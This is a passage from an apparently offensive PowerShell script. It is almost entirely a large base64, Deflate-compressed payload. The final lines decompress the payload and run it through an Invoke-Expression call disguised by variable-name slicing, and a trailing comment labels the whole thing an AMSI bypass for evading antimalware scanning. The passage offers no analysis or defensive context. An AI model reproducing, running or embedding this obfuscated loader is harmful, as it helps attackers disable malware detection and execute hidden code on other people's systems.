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') , [io.COmprESSIoN.CompRESSiONmOde]::dECoMpREsS ) | FOrEacH{New-OBJecT  Io.STReAmrEAdeR($_, [TeXT.eNCoDInG]::aScII ) } | FoREach {$_.rEadToeND() }) |.((VaRIabLE '*Mdr*').nAMe[3,11,2]-joIN'')} Kirby | Write-Output
 '@
 
 # AmS1 bypa5S.
